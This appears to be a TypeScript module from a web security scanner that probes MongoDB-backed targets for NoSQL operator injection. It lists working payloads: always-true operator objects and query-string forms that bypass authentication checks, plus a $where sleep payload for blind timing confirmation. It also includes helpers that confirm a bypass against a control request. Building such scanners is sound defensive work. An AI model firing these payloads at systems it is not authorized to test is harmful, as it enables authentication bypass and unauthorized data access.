// NoSQL / operator injection (MongoDB / Mongoose / MarsDB). A document store IGNORES the SQL payloads probe_sqli fires
// ('1'='1', SLEEP(5)), so probe_sqli reports a Mongo-backed target clean — this probe fires OPERATOR payloads instead:
// an always-true comparison ({$ne:null}/{$gt:''}) turns a field check into an auth/filter bypass, and $where runs JS.

/** Operator objects that make a field comparison always-true (auth/filter bypass), as they appear in a JSON VALUE
 *  position — substituted raw so they stay real objects (setJsonField would stringify them). */
export const NOSQL_OP_OBJECTS: ReadonlyArray<{ label: string; json: string }> = [
  { label: "$ne:null", json: '{"$ne":null}' },
  { label: "$gt:empty", json: '{"$gt":""}' },
  { label: "$ne:1", json: '{"$ne":1}' },
  { label: "$regex:any", json: '{"$regex":".*"}' },
];

/** Query-string bracket form of the same operators: field[$op]=value. */
export const NOSQL_OP_QUERY: ReadonlyArray<{ label: string; op: string; val: string }> = [
  { label: "[$ne]=", op: "$ne", val: "" },
  { label: "[$gt]=", op: "$gt", val: "" },
  { label: "[$regex]=", op: "$regex", val: ".*" },
];

/** A JSON string literal used as the benign CONTROL value (must NOT match anything → the request must fail). */
export const NOSQL_CONTROL_VALUE = '"__verdict_nonexistent_zzz__"';

/** A $where JS-string that sleeps `ms` — blind time-based confirmation, reusing the shared timing oracle. */
export const nosqlTimeObject = (ms: number): string => `{"$where":"sleep(${ms})"}`;

const NOSQL_ERR_RE =
  /MongoError|MongoServerError|MongoParseError|CastError|BSONError|E11000|\bmongoose\b|MarsDB|BadValue|unknown (?:top level )?operator|\$where|can't \$(?:ne|gt|regex)/i;

/** Mongo/Mongoose/MarsDB error signature in a response body (a HINT, not a confirmation on its own). */
export function nosqlErrorSignature(body: string): string | undefined {
  return NOSQL_ERR_RE.exec(body)?.[0];
}

/** Auth/filter bypass CONFIRMED: the literal control FAILED and every operator positive SUCCEEDED, stably. "Success" is
 *  the presence of `marker` (e.g. a returned token / "authentication") when given, else a 2xx status the control lacked.
 *  Requiring the control to fail rejects an endpoint that accepts anything (no real bypass). */
export function nosqlBypassConfirms(
  control: { status: number; body: string },
  positives: ReadonlyArray<{ status: number; body: string }>,
  marker?: string,
): boolean {
  if (positives.length < 2) return false;
  const succeeded = (r: { status: number; body: string }): boolean =>
    marker ? r.body.includes(marker) : r.status >= 200 && r.status < 300;
  if (succeeded(control)) return false; // control must FAIL, else it's not a bypass
  return positives.every(succeeded) && positives.every((p) => p.status === positives[0]!.status);
}

/** Build the query-string bracket form (`field[$op]=val`) from a URL + param, dropping the plain param key. */
export function nosqlQueryUrl(url: string, param: string, op: string, val: string): string | null {
  try {
    const u = new URL(url);
    u.searchParams.delete(param);
    u.searchParams.set(`${param}[${op}]`, val);
    return u.toString();
  } catch {
    return null;
  }
}
